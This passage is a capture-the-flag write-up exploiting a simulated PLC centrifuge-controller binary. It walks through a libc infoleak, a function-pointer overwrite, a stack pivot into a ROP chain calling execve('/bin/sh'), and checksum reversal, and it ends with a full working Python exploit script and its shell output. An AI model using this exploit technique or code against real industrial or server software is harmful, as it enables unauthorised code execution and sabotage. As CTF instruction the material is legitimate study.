Breakpoint 6: 0x55ad6f3b60e1, print_plc_status+178
wdb> x/s $rsi0x55ad6f5b78a4: "URANIUM HEXAFLUORIDE"
wdb> x/24x $rsi
0x55ad6f5b78a4: 0x4e415255    0x204d5549    0x41584548    0x4f554c46
0x55ad6f5b78b4: 0x45444952    0x00000000    0x00000000    0x00000000
0x55ad6f5b78c4: 0x00000000    0x00000000    0x00000000    0x00000000
0x55ad6f5b78d4: 0x00000000    0x00000000    0x00000000    0x00000000
0x55ad6f5b78e4: 0x00000001    0x6f3b5ab0    0x000055ad    0x1a0bfec0
0x55ad6f5b78f4: 0x00007f58    0x00000000    0x00000000    0x00000000
wdb> vmmap
0x55ad6f3b5000-0x55ad6f3b7000 r-x csaw_plc
0x55ad6f5b6000-0x55ad6f5b7000 r-- csaw_plc
0x55ad6f5b7000-0x55ad6f5b8000 rw- csaw_plc
0x55ad708c3000-0x55ad708e5000 rw-
0x7f5819e61000-0x7f5819e87000 r-x ld-linux-x86-64.so.2
0x7f5819e87000-0x7f5819e88000 rw-
0x7f5819e88000-0x7f5819e89000 rw-
0x7f581a086000-0x7f581a087000 r-- ld-linux-x86-64.so.2
0x7f581a087000-0x7f581a089000 rw- ld-linux-x86-64.so.2
0x7f581a089000-0x7f581a155000 r-x 2.23-0ubuntu10
0x7f581a155000-0x7f581a156000 r-x 2.23-0ubuntu10
0x7f581a156000-0x7f581a249000 r-x 2.23-0ubuntu10
0x7f581a249000-0x7f581a449000 --- 2.23-0ubuntu10
0x7f581a449000-0x7f581a44d000 r-- 2.23-0ubuntu10
0x7f581a44d000-0x7f581a44f000 rw- 2.23-0ubuntu10
0x7f581a44f000-0x7f581a453000 rw-
0x7fff1367a000-0x7fff1369b000 rw- [brk]
wdb> x/x 0x55ad6f3b5ab0
0x55ad6f3b5ab0: 0xe5894855
wdb> disas 0x55ad6f3b5ab0
0xab0 <+0>:    push    rbp
0xab1 <+1>:    mov     rbp, rsp
0xab4 <+4>:    lea     rdi, [rel 0x13d8]  "[WARNING]"
0xabb <+11>:   call    0x8d0 <puts>
0xac0 <+16>:   lea     rdi, [rel 0x13e8]  "[WARNING] /!\ CENTRIFUGE EXCEEDI…"
0xac7 <+23>:   call    0x8d0 <puts>
0xacc <+28>:   mov     esi, 0x109a0
0xad1 <+33>:   lea     rdi, [rel 0x1420]  "[WARNING]   MAXIMUM SAFE RPM: %u…"
0xad8 <+40>:   mov     eax, 0x0
0xadd <+45>:   call    0x900 <printf>
0xae2 <+50>:   mov     eax, dword [rel 0x2028a0]
0xae8 <+56>:   mov     esi, eax
0xaea <+58>:   lea     rdi, [rel 0x1442]  "[WARNING]   CURRENT RPM: %d\n"
0xaf1 <+65>:   mov     eax, 0x0
0xaf6 <+70>:   call    0x900 <printf>
0xafb <+75>:   lea     rdi, [rel 0x13e8]  "[WARNING] /!\ CENTRIFUGE EXCEEDI…"
0xb02 <+82>:   call    0x8d0 <puts>
0xb07 <+87>:   lea     rdi, [rel 0x13d8]  "[WARNING]"
0xb0e <+94>:   call    0x8d0 <puts>
0xb13 <+99>:   nop     
0xb14 <+100>:  pop     rbp
0xb15 <+101>:  retn    
wdb> x/x 0x7f581a0bfec0
0x7f581a0bfec0: 0x28ec8148
```

So we can see here that the particular address we are leaking here is that of `rpm_alert`, which is the function which is ran when the centrifuge's rpm get's too hi. However when it's called, we see something interesting:

```
0xdc3 <+504>:  lea     rdi, [rel 0x150a]  "[FAILSAFE]"
0xdca <+511>:  call    0x8d0 <puts>
0xdcf <+516>:  lea     rdi, [rel 0x1518]  "[FAILSAFE] EXCEEDED SAFE RPM LIM…"
0xdd6 <+523>:  call    0x8d0 <puts>
0xddb <+528>:  lea     rdi, [rel 0x150a]  "[FAILSAFE]"
0xde2 <+535>:  call    0x8d0 <puts>
0xde7 <+540>:  mov     rdx, qword [rel 0x2028f0]
0xdee <+547>:  mov     eax, 0x0
0xdf3 <+552>:  call    rdx
```

The `rpm_alert` function is not directly called. It's address is moved from a region of memory into a register, then that register is called. The address that is executed is probably loaded from the same space that we are leaking. Reason for me believing is when we overwrite the `rpm_alert` address stored and cause an unsafe RPM to be reached, we get a seg fault. That copled with the fact that one of our previous steps was to cause that code path to be executed. 

In addition to that, immediately following the `rpm_alert` we can see that libc address `0x7f581a0bfec0`, which we can also leak. The offset from the base of libc is `- 0x36ec0` since `0x7f581a089000 - 0x7f581a0bfec0 = -0x36ec0`.

So we have an infoleak that breaks PIE (so we know the address of functions like `main` and `execute_firmware`) and libc, and we can execute a single address. With this we can get a shell.

So the next hurdle that we have is that we can only execute one address. What we can do to get around this is a Stack Pivot. Essentially what we will do, is increment the value of `rsp` to move the stackto a location we control (where we store the rop chain). Then it will start executing our ROP Chain. For the area of memory that we control that will store our ROP Chain, we can store it in the `cmd` char array. The only value that is actually evaluated is the first bytes, so that leaves us with plenty of space to work with.

Now the next spot is to figure out how far we will need to move the stack. Let's see how our input on the stack correlates to the value of `rsp` when  the `call rdx` gadget which gives us code execution is ran:

```
wdb> vmmap
0x55b6ddcc2000-0x55b6ddcc4000 r-x csaw_plc
0x55b6ddec3000-0x55b6ddec4000 r-- csaw_plc
0x55b6ddec4000-0x55b6ddec5000 rw- csaw_plc
0x55b6de1ec000-0x55b6de20e000 rw-
0x7f618876e000-0x7f6188794000 r-x ld-linux-x86-64.so.2
0x7f6188794000-0x7f6188795000 rw-
0x7f6188795000-0x7f6188796000 rw-
0x7f6188993000-0x7f6188994000 r-- ld-linux-x86-64.so.2
0x7f6188994000-0x7f6188996000 rw- ld-linux-x86-64.so.2
0x7f6188996000-0x7f6188a62000 r-x 2.23-0ubuntu10
0x7f6188a62000-0x7f6188a63000 r-x 2.23-0ubuntu10
0x7f6188a63000-0x7f6188b56000 r-x 2.23-0ubuntu10
0x7f6188b56000-0x7f6188d56000 --- 2.23-0ubuntu10
0x7f6188d56000-0x7f6188d5a000 r-- 2.23-0ubuntu10
0x7f6188d5a000-0x7f6188d5c000 rw- 2.23-0ubuntu10
0x7f6188d5c000-0x7f6188d60000 rw-
0x7ffd43c50000-0x7ffd43c71000 rw- [brk]
wdb> find 0x7ffd43c50000 0x7ffd43c71000 15935728
Found target at: 0x7ffd43c70d21
wdb> p $rsp
$1 = 0x7ffd43c70d00
```

So we can see that our input starts `0x21` bytes, and when we step to the first rop gadget the distance will be increased by `0x8` bytes leading to a distance of `0x29` bytes. The closest rop gadget that we have which will accomplish this is `add rsp, 0x38 ; ret`. We will add filler data for the first 15 bytes of our ROP chain to occupy the space between our input and where the stack is pivoting to.

The next thing we need to do is actually make our ROP chain. When we do this, we have to consider that `disable_system` which is ran at the start disables the use of `system` and `execve`. To counter this, we will just make a `syscall`:

this is our ROP chain
```
pop ptr to "/bin/sh" into $rdi
pop 0x3b into $rax (code for sys_execve)
pop ptr to 0x0 into $rsi
pop ptr to 0x0 into $rdx
make the syscall
```

The last thing is we just need to find a ptr to "/bin/sh". We 

```
wdb> vmmap
0x557358e01000-0x557358e03000 r-x csaw_plc
0x557359002000-0x557359003000 r-- csaw_plc
0x557359003000-0x557359004000 rw- csaw_plc
0x55735a894000-0x55735a8b6000 rw-
0x7f1e038ad000-0x7f1e038d3000 r-x ld-linux-x86-64.so.2
0x7f1e038d3000-0x7f1e038d4000 rw-
0x7f1e038d4000-0x7f1e038d5000 rw-
0x7f1e03ad2000-0x7f1e03ad3000 r-- ld-linux-x86-64.so.2
0x7f1e03ad3000-0x7f1e03ad5000 rw- ld-linux-x86-64.so.2
0x7f1e03ad5000-0x7f1e03ba1000 r-x 2.23-0ubuntu10
0x7f1e03ba1000-0x7f1e03ba2000 r-x 2.23-0ubuntu10
0x7f1e03ba2000-0x7f1e03c95000 r-x 2.23-0ubuntu10
0x7f1e03c95000-0x7f1e03e95000 --- 2.23-0ubuntu10
0x7f1e03e95000-0x7f1e03e99000 r-- 2.23-0ubuntu10
0x7f1e03e99000-0x7f1e03e9b000 rw- 2.23-0ubuntu10
0x7f1e03e9b000-0x7f1e03e9f000 rw-
0x7ffd3a144000-0x7ffd3a165000 rw- [brk]
wdb> find 0x7f1e03ba2000 0x7f1e03c95000 /bin/sh
Found target at: 0x7f1e03c61d57
wdb> x/s 0x7f1e03c61d57
0x7f1e03c61d57: "/bin/sh"
```

We can see that `/bin/sh` is in libc at `0x7f1e03c61d57`. We can also see that it's offset from the base of libc is `0x18cd57` since `0x7f1e03c61d57 - 0x7f1e03ad5000 = 0x18cd57`.

Now one thing I realized we will need to do at the very end, we will need to reverse the cheskum algorithm. The reason for this being, when we run it against the live server, it doesn't have the debugging option to print the checksum. In addition to that because of aslr the address of the pivot ROP gadget will change, and so will the checksum for it's firmware. Below is the reversing process for it's assembly:

```
0xe35:  movzx   eax, word [rbp-0x10]
0xe39:  shl     eax, 0xc
0xe3c:  mov     edx, eax
```
Here we can see it takes the memory at `rbp-0x10` (on the first loop is `0`), moves it into the `eax` register, shifts it over to the left by `0xc`, then moves it into the `edx` register

```
0xe3e:  movzx   eax, word [rbp-0x10]
0xe42:  shr     ax, 0x4
0xe46:  or      eax, edx
```
Here it just moves the value of `rbx-0x10` (on the first loop is `0`) into `eax`, shifts it to the right by four, then ors it with the `edx` register.

```
0xe48:  mov     word [rbp-0x10], ax
0xe4c:  mov     eax, dword [rbp-0xc]
0xe4f:  add     word [rbp-0x10], ax
```

For this segment we can see it essentially just add the contents of `eax` with that of `rbp-0xc`, and stores it in `rbp-0x10`.

```
0xe53:  mov     eax, dword [rbp-0xc]
0xe56:  cdqe    
```

Here we can see it just moves `rbp-0xc` into `eax`, then converts it into a qword from a dword.

```
0xe58:  lea     rdx, [rax+rax]
0xe5c:  mov     rax, qword [rbp-0x8]
0xe60:  add     rax, rdx
0xe63:  movzx   eax, word [rax]
```

Here we can see it takes characters from our inputs, and adds the decimal values together.

```
0xe66:  xor     word [rbp-0x10], ax
```
This just xors the contents of the `eax` register with `rbp-0x10`, and stores in in `rbp-0x10`

```
0xe6a:  add     dword [rbp-0xc], 0x1
0xe6e:  cmp     dword [rbp-0xc], 0x1ff
0xe75:  jle     0xe35
```

and finally we hit the condition of the four loop. It just increments `rbp-0xc` (we can see it starts off at `2`) by one, and will exit if that value is greater than `0x1ff`. Looking at the later assembly code, we can see that the checksum itself is stored in `rbp-0x10`, however we will need to do a bit of tampering with it to get the two individual bytes. With that, we can write our own checksum algorithm.

## tl;dr

So here is how we pop a shell
*	Reverse out custom firmware
*	Use buffer overflow bug to leak libc address, then use same bug to overwrite pointer to `rpm_alert` function for code execution of a signle gadget
*	Cause an emergency shutdown to trigger overflown gadget (`add rsp 0x38`) to execute, use the gadget to pivot stack into ROP chain
*	Use rop chain to make syscall to get a shell
*	Reverse checksum algorithm

## Exploit

here is the code for our exploit:

```
# This writeup is based off of: https://ctftime.org/writeup/11273

# Import the python libraries, and establish the target
import interact
import struct

target = interact.Process()

# Declare needed rop gadgets offsets
popRdi = 0x21102
popRax = 0x33544
popRsi = 0x202e8
popRdx = 0x1b92

binsh =  0x18cd57 

syscall = 0xbc375

addRsp = 0xc96a6

# A function desgined to just setup initial firmware to enable debugging
def debugFirmware():
	target.sendline('U')
	initialFirmware = "FW" + "\xa2\xc8" + "1081" + "9"
	initialFirmware = initialFirmware + "\x00" * (0x400 - len(initialFirmware))
	target.sendline(initialFirmware)
	target.sendline(initialFirmware)
	target.sendline('E')

# This is the checksum generation algorithm, heavily based off of the writeup linked above
def genChecksum(fw):
    i = 2
    j = 0
    x = 0
    y = 0
    z = 0
    while i <= 0x1ff:
        x = z
        x <<= 0xc
        y = x

        x = z
        x >>= 0x4
        x |= y

        z = x + (i & 0xffff)
        z &= 0xffff
        x = ord(fw[j]) + 0x100*ord(fw[j+1])
        z ^= x
        i += 1
        j += 2
    return chr(z & 0xff) + chr(z >> 8)
# An update function, which will use debugging features to get the firmware, then print it out
def debugUpdateFirmware(firmware, exe=''):
	# Update the firmware with a bad checksum, wee what the actual checksum it
	target.sendline('U')
	fw = "FW" + "00" + "10" + firmware
	fw = fw + "\x00" * (0x400 - len(fw))
	target.sendline(fw)
	target.readuntil("ACTUAL FW CHECKSUM: ")
	checksum = target.read(4)
	c0 = int("0x" + checksum[0:2], 16)
	c1 = int("0x" + checksum[2:4], 16)
	print "\n\n\n\n\nc0: " + hex(c0) + " c1: " + hex(c1) + "\n\n\n\n\n"

	# Update the firmware with coorect checksum
	target.sendline('U')
	fw = "FW" + struct.pack('<B', c1) + struct.pack('<B', c0) + "10" + firmware
	fw = fw + "\x00" * (0x400 - len(fw))	
	target.sendline(fw)
	target.sendline('E' + exe)
	
# An update function for attacking the live target, so no debugging features to tell us the firmware    
def liveUpdateFirmware(firmware):
	target.sendline('U')
	fw = "FW" + firmware
	target.sendline(fw + "\x00" * (0x400 - len(fw)))
	print target.readuntil("FIRMWARE UPDATE SUCCESSFUL!")
	target.sendline('E')		
	print target.readuntil("ENRICHMENT PROCEDURE IS RUNNING")

# Basically the above function, but doesn't execute the firmware
def liveUpdateFirmwareNoExec(firmware):
	target.sendline('U')
	fw = "FW" + firmware
	target.sendline(fw + "\x00" * (0x410 - len(fw)))
	print target.readuntil("FIRMWARE UPDATE SUCCESSFUL!")


# Scan in the inital text
print target.readuntil(" - - - - - - - - - - - - - - - - - - - -")

# Send the firmware to get the libc infoleak
liveUpdateFirmware("\x3f\x74" + "10" + "81" +  "20"*76 + "9")

# Get the infoleak, filter it out
target.sendline("S")

print target.readuntil("0000000000000000000000000000000000000000000000000000000000000000000000000000")
libcleak = target.read(8)
libcleak = libcleak.replace("\x0a", "")
libcleak = libcleak.replace("\x20", "")
leak = int(struct.unpack('<Q', libcleak + "\x00"*(8 - len(libcleak)))[0])
libc = leak - 0x36ec0
print "libc: " + hex(libc) 

# Build the ROP Chain
chain = "0"*15 # 15 bytes of filler data, so the start of our rop chain matches with where the stack gets pivoted to

chain += struct.pack("<Q", libc + popRdi)# Pop ptr to "/bin/sh" into $rdi
chain += struct.pack("<Q", libc + binsh)

chain += struct.pack("<Q", libc + popRax)# Pop 0x3b into $rax (code for syscall_execve)
chain += struct.pack("<Q", 0x3b)

chain += struct.pack("<Q", libc + popRsi)# Pop 0x0 into $rsi
chain += struct.pack("<Q", 0x0)

chain += struct.pack("<Q", libc + popRdx)# Pop 0x0 into $rdx
chain += struct.pack("<Q", 0x0)

chain += struct.pack("<Q", libc + syscall)# Make the syscall

stackPivotAdr = struct.pack("<Q", libc + addRsp)# address of pivot gadget (add rsp 0x38)

# Add 2s infront of every byte, so it will write the gadget
stackPivot = ""
for i in stackPivotAdr:
	stackPivot += "2" + i

# Construct the firmware (everything after the checksum)
firmware = "10" + "81" + "7"*80 + "20"*68 + stackPivot  + "9"
firmware = firmware  + "\x00" * (0x400 - len(firmware))

# Send the firmware with the generated checksum
liveUpdateFirmwareNoExec(genChecksum(firmware) + firmware)

# Push our ROP chain to the stack, then execute the firmware 
target.sendline("E" + chain)

# Drop to an interactive shell
target.interactive()
```

and when we run it:

```
$ python exploit.py
.	.	.
$ ls. .. flag$
$ cat flag
flag{1s_thi5_th3_n3w_stuxn3t_0r_jus7_4_w4r_g4m3}
```

Just like that, we got the flag!